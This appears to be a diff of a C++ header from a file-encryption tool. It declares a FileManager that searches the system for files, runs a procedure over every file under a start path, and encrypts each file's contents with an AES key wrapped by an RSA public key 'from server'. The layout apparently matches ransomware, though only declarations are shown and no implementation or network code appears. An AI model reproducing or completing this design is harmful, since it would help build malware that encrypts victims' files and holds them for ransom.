@@ -13,23 +13,12 @@ class FileManager;
 class File {
 friend FileManager;
 public:
-    File(std::string& path)
-    {
-        this->m_Metadata.path = Serialization::SerializeString(path);
-
-        if ( !FilePathExists() )
-            return;
-
-        this->m_Metadata.size      = std::filesystem::file_size(path);
-        this->m_Metadata.name      = Serialization::SerializeString(std::filesystem::path(path).filename().string());
-        this->m_Metadata.extension = Serialization::SerializeString(std::filesystem::path(path).extension().string());
-    }
+    File(std::string& path);
 
     bool              FilePathExists();
     std::string       ReadFrom();
     bool              WriteTo(std::string& data);
     inline void       SetEncryptionKey(BYTESTRING key) { this->m_B64RSAAESKey = std::move(key); };
-
 private: 
     struct FileMetadata {
         BYTESTRING    path;      // full path with name
@@ -39,26 +28,25 @@ private:
         BYTESTRING    contents;  // data in the file
     } m_Metadata;
 
-    // aes key encrypted with rsa public key from server
-    // encoded with base64
-    // that was used to encrypt the file
+    /* 
+       aes key encrypted with rsa public key from server
+       encoded with base64
+       that was used to encrypt the file
+    */
     BYTESTRING        m_B64RSAAESKey;
 };
 
 class FileManager {
 public:
-    FileManager(RSA* rsa)
-        : m_RSAPublicKey(rsa)
-    {
-    }
-
-    void              FindFiles(std::string& startPath); // search system for files
-    bool              EncryptContents(File& file); // encrypt the contents of 'file'
-    bool              DecryptContents(File& file, RSA* privKey);
+    inline void       SetPublicKey(RSA* key) { this->m_EncryptionKeys.pub = key; }
+    inline void       SetPrivateKey(RSA* key) { this->m_EncryptionKeys.priv = key; }
+    void              FindFiles(const std::string& startPath); // search system for files
+    void              TransformFiles(const std::string& startPath, void (FileManager::*procedure)(File&), FileManager& context); // run a function on all files found in startPath
+    void              EncryptContents(File& file);             // encrypt the contents of 'file'
+    void              DecryptContents(File& file);
     inline void       AddFile(File& file) { this->m_FileList.push_back(file); }
-    const BYTESTRING  TransformFile(File& file);   // convert file metadata to BYTESTRING. can be sent over sockets theoretically
-    void              OutputFoundFiles(RSA* temp);
+    void              OutputFoundFiles();                      // output all files in FileList 
 private:
     std::vector<File> m_FileList;
-    RSA*              m_RSAPublicKey;              // public key to encrypt generated aes keys with
+    RSAKeys           m_EncryptionKeys; // key to encrypt generated aes keys with
 };
